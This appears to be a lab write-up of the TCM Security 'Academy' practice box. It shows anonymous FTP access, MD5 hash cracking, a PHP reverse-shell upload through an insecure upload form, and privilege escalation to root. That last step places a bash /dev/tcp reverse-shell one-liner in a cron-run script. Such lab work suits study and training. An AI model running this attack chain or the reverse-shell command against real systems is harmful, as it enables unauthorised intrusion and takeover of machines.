# Summary

This box was created by **TCM Security** for their Practical Ethical Hacking course and the experience is more **practical** rather than ctf oriented.

# Scanning & Enumeration

### Findings

Ports **21**, **22**, and **80** are the only ports open on our target based on our Nmap scan.

## FTP

```bash
ftp 10.0.2.152
```

- Ftp (21) seems to allow `Anonymous` login.

- We were able to confirm this by anonymous login to ftp and we used `anonymous` as the username and password.

![ftp](/assets/img/ftp_login.png)

- We found a text file on the `ftp` server called **note.txt**

![ftp note](/assets/img/ftp_file.png)

- From the text file, we found that `jdelta` left a message for `Heath` that `Grimme` had set up a test site for their new academy.

![note](/assets/img/ftp_note_content.png)

- `jdelta` informed `Grimme` not to use the same password everywhere, he will change it ASAP.

- We also got to know that `jdelta` couldn't create a user via the admin panel but instead inserted directly into the database with the following command:

```bash
INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
```

- Lastly, the `StudentRegno` was used to login. 

## HTTP

We navigated to `http://10.0.2.18` on our web browser and found a default **Apache2 Debian** page on the test website. Also, we found that the web server is version `2.4.38 Apache HTTP Server` after fingerprinting with **Wappalyzer**

![default page](/assets/img/http_default_page.png)

![fingerprint](/assets/img/http_fingerprint.png)

### Directory Fuzzing with FFuF

We couldn't find anything to work with on the website so we did some **directory fuzzing** with a tool called [ffuf](https://github.com/ffuf/ffuf) to find hidden directories or files on the webserver.

```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.152/FUZZ
```

```bash

```

Findings:

- We found 5 hidden directories on the webserver (**.htaccess**, **.htpasswd**, **academy**, **phpmyadmin**, **server-status**)

- We were denied access to **.htaccess**, **.htpasswd**, and **server-status** but were able to further validate the webserver's version due to some information disclosure.

![htaccess](/assets/img/http_htaccess.png)

![htpasswd](/assets/img/http_htpasswd.png)

![server](/assets/img/http_server_status.png)

- We found an online course registration portal in the **academy** directory. And this confirms **jdelta**'s message in the `note.txt` file.

![portal](/assets/img/online_portal.png)

- We found a php admin login page in the **phpmyadmin** directory. 

![php portal](/assets/img/php_admin_portal.png)

- We also tried the default credential (root:password) for phpmyadmin but couldn't get access.

![default credential](/assets/img/php_admin_default_credential.png)

![denied](/assets/img/php_admin_denied.png)

- We did further directory fuzzing on **phpmyadmin** directory and found a bunch of other hidden directories and files. However, they led to nothing because we couldn't access any of them.

### Academy Test Site

Looking back at **jdelta**'s message in **note.txt**, the `StudentRegno` was used to login and we tried to login with the credentials (10201321:cd73502828457d15655bbd7a63fb0bc8) but couldn't gain access. 

It seems that the password is a hash so we used `hash-identifier` and [CyberChef](https://gchq.github.io/CyberChef/) to check the hash type.

![hash](/assets/img/hash_identifer.png)

![cyberchef](/assets/img/Cyberchef_hash_identifier.png)

We identified the hash type to be `MD5` and then we used `hashcat` to crack the hash.

```bash
hashcat -a 0 -m 0 cd73502828457d15655bbd7a63fb0bc8 /usr/share/wordlists/rockyou.txt
```

![hashcat](/assets/img/hash_cat.png)

The password is `student` and we used it to login to the online course registration portal.

![login](/assets/img/online_portal_login.png)

In the `My Profile` tab, there is a file upload functionality that accepts other file extenstion other than jpeg or png. Therefore it is susceptable to **file upload** vulnerable and we tested it out by uploading a php reverse shell script. Note that the server runs a `phpmyadmin` database manager in the backend.

File upload vulnerability is when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Learn more [here](https://portswigger.net/web-security/file-upload)

See [demonstration video](https://www.veed.io/view/4f642bc7-f952-499a-a193-9cf41048c0d3?panel=share) 

We used Pentest Monkey's php_reverse_shell script with **netcat** to catch a reverse shell on our attacker machine. See [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

**Note**: change the `ip` address in the script to your attacker machine ip address and change the port number (optional)

![pentest reverse](/assets/img/pentest_reverse_shell.png)

![reverse](/assets/img/reverse_shell.png)

We got a successful reverse shell on our attacker machine.

## Privilege Escalation

We did some manual privilege escalation but we couldn't find anything to work with. We were only able to view `/etc/passwd` file and we found that **Grimme** is an administrator on this machine.

![etc](/assets/img/etc_passwd.png)

We then used [**linpeas**](https://github.com/carlospolop/PEASS-ng) to perform more advanced privilege escalation on our target machine.

![linpeas](/assets/img/linpeas.png)

We transfered the linpeas script from our attacker machine to the **/tmp** folder on our target machine.

**Note**: Don't forget to change the linpeas script to executable before running it

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh
```

![grimme](/assets/img/grimmie_backup.png)

From linpeas result, we found **two** interesting things:

- A backup script in `/home/grimmie/backup.sh`

- a password for mysql database in `/var/www/html/academy/admin/includes/config.php`

![sql](/assets/img/my_sql_pass.png)

The password turns out to be for `Grimmie`

![config php](/assets/img/config_php.png)

### SSH

Looking back at our nmap scan, ssh was open on port `22` so we decided to use Grimmie's credentials (grimmie:My_V3ryS3cur3_P4ss) to login via ssh.

```bash
ssh grimmie@10.0.2.152
```

![ssh login](/assets/img/ssh_login.png)

We were able to login successfully with Grimmie's credentials and found the `backup.sh` script.

![backup](/assets/img/backup.png)

The script:
1. Removes the existing file `/tmp/backup.zip` if it exists.
2. Creates a new ZIP archive named `backup.zip` in the `/tmp` directory.
3. Adds the contents of the `/var/www/html/academy/includes` directory to the ZIP archive.
4. Sets the file permissions of the newly created ZIP archive to `700` (read, write, and execute only for the owner).

#### Pspy

We did some manual privilege escalation to look for cron jobs runing the backup script but couldn't find any. 

So we used a tool called [**Pspy**](https://github.com/DominicBreuker/pspy) to snoop on processes without need for root permissions, as well as to see commands run by other users, cron jobs, etc. as they execute.

![pspy](/assets/img/pspy.png)

```bash
chmod +x pspy64
```

```bash
./pspy64
```

![result](/assets/img/pspy_result.png)

From the result, we can see that the backup script is executed by a cron job in the background. 

We will abuse this to gain a reverse shell by replacing the commands in the `backup.sh` script with a bash reverse shell one liner command. So once the backup script is executed again in the background, we should get a reverse shell on our attacker machine.

> Add this one liner command to replace the command in **backup.sh**

```bash
bash -i >& /dev/tcp/10.0.2.18/8080 0>&1
```

## Pwned

![pwned](/assets/img/root.png)

The cron job executed the script successfully and we got **root** access on the machine :)
